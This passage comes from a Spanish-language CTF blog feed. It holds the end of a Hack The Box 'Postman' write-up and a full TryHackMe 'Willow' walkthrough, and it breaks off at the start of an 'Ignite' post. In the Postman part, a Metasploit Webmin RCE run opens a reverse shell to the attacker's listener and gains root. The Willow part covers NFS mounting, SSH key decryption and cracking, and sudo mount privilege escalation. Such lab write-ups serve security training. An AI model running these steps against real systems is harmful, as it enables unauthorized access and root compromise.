msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts 10.10.10.160
&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.10.160
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; 
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
   RHOSTS     10.10.10.160     yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&#34;s1&#34;&gt;&amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
   RPORT      &lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt;            yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SSL        &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;            no        Negotiate SSL/TLS &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; outgoing connections
   TARGETURI  /                yes       Base path &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd/unix/reverse_perl&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Webmin &amp;lt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 1.910


msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost tun0
&lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.10.14.67
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; USERNAME Matt
&lt;span class=&#34;nv&#34;&gt;USERNAME&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; Matt
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; PASSWORD computer2008
&lt;span class=&#34;nv&#34;&gt;PASSWORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; computer2008
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SSL &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;SSL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;linux/http/webmin_packageup_rce&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.67:4444 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Session cookie: 4c7f4b517283e96d41da23ced104e00a
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Attempting to execute the payload...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.14.67:4444 -&amp;gt; 10.10.10.160:42436&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-12-29 22:13:48 -0600
id


&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
root
/usr/share/webmin/package-updates/
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-29_22-25-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una sesion con privilegios root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/Screenshot_2019-12-29_22-28-41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/postman/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/postman/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Willow</title>
        <link>https://sckull.github.io/posts/willow/</link>
        <pubDate>Thu, 12 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 12 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/willow/</guid>
        <description>Willow es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Willow es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Willow&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;What lies under the Willow Tree?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;380&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Feb 28 14:00:08 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate willow.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; willow.thm
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
111/tcp  open  rpcbind 2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
2049/tcp open  nfs     2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100003)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Feb 28 14:01:52 2020 -- 1 IP address (1 host up) scanned in 103.49 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/new_rom# gobuster dir -u http://willow.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---willow&#34;&gt;USER - Willow&lt;/h2&gt;
&lt;h3 id=&#34;private-key&#34;&gt;PRIVATE KEY&lt;/h3&gt;
&lt;p&gt;En la pagina principal de willow encontramos una cadena en hexadecimal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_182247.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos CyberChef para decodificar el contenido de esta cadena.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_182347.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Èncontramos un mensaje en el que indica que la clave privada de Willow esta encriptada - &lt;em&gt;Asumimos que willow es un usuario registrado en la maquina&lt;/em&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Hey Willow, here&#39;s your SSH Private key -- you know where the decryption key is!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Adjunto al mensaje, una lista de numeros.&lt;/p&gt;
&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;p&gt;En el puerto 2049 encontramos un punto de montaje el cual puede utilizar cualquiera (nobody:nogroup), utilizamos &lt;code&gt;mount&lt;/code&gt; para montar la carpeta permitida (&lt;code&gt;/var/failsafe&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/willow# showmount -e willow.thm
Export list &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; willow.thm:
/var/failsafe *
root@aoiri:~/tryhackme/willow# mkdir tmp_nfs
root@aoiri:~/tryhackme/willow# &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/root/tryhackme/willow
root@aoiri:~/tryhackme/willow# mount -t nfs willow.thm:/var/failsafe /root/tryhackme/willow/tmp_nfs/
root@aoiri:~/tryhackme/willow# ls tmp_nfs/
rsa_keys
root@aoiri:~/tryhackme/willow# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; tmp_nfs/
root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys 
Public Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;23, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Private Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*****, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/willow/tmp_nfs# ls -lah
total 12K
drwxr--r-- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; nobody nogroup 4.0K Jan &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 10:31 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root   root    4.0K Feb &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 14:05 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root      &lt;span class=&#34;m&#34;&gt;62&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 10:31 rsa_keys
root@aoiri:~/tryhackme/willow/tmp_nfs#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El contenido del archivo que encontramos en la carpeta es &lt;code&gt;rsa_keys&lt;/code&gt; que contiene las claves para la clave publica y la clave privada.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys 
Public Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;23, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Private Key Pair: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*****, *****&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En este post &lt;a href=&#34;https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/&#34;&gt;&lt;strong&gt;RSA Encription&lt;/strong&gt;&lt;/a&gt; explica a la perfeccion como funcionan, encriptacion y desencriptacion de RSA. Para este reto escribi un pequeño script en python que por cada numero que encontramos en el mensaje, lo vamos a convertir a hexadecimal utilizando las claves (6&amp;mdash;7, 3&amp;mdash;7) del archivo &lt;code&gt;rsa_keys&lt;/code&gt;, en este caso vamos a utilizar el de la clave privada para poder conectarnos atraves del servicio SSH. Una vez hecho lo anterior convertimos a texto el mensaje (lista) en hexadecimal que obtuvimos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184201.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos nuestro script y obtenemos nuestra clave privada:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184228.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la clave para iniciar sesion en el servicio de SSH pero esta esta protegida por una frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184439.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos John para obtener el hash de la clave y obtener la frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184541.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Una vez con la frase de nuestro archivo, iniciamos sesion en el servicio SSH y obtenemos nuestra shell con usuario Willow.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184605.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen en la carpeta principal de Willow:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184755.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La codificamos a base64 y utilizamos nuevamente &lt;code&gt;CyberChef&lt;/code&gt; para renderizar nuestra imagen (podemos utilizar &lt;code&gt;scp&lt;/code&gt; btw), obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_184932.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos los comandos que podemos ejecutar sin contraseña utilizando sudo &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que podemos utilizar &lt;code&gt;mount&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_185607.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos /mnt/ y encontramos la carpeta /creds que no contiene nada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_190214.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos el contenido de &lt;code&gt;/dev&lt;/code&gt; en donde se supone estan las &amp;ldquo;particiones&amp;rdquo; montadas, y podemos ver inmediatamente &lt;code&gt;hidden_backup&lt;/code&gt; lo cual no es muy comun de encontrar.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_190519.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que podemos utilizar &lt;code&gt;mount&lt;/code&gt; con sudo vamos a proceder a montar esta &amp;ldquo;particion&amp;rdquo; en &lt;code&gt;/mnt/creds&lt;/code&gt; (puede ser en cualquier otra carpeta a la que willow tenga acceso).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_191309.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos las credenciales del usuario root y willow, cambiamos al usuario root y dentro de su carpeta encontramos un mensaje en &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_191420.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La nota nos indica que la flag &lt;strong&gt;root.txt&lt;/strong&gt; ya nos fue dada antes de que obtuvieramos una shell, recordemos que la primera flag la encontramos en la imagen, regresamos a la imagen que encontramos y extraemos su contenido con la contraseña de root, en donde podemos ver nuestra ultima flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/willow/Screenshot_20200228_191723.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/willow/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/willow/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Ignite</title>
        <link>https://sckull.github.io/posts/ignite/</link>
        <pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 02 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/ignite/</guid>
        <description>Ignite es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Ignite es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Ignite&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;A new start-up has a few issues with their web server.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;600&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
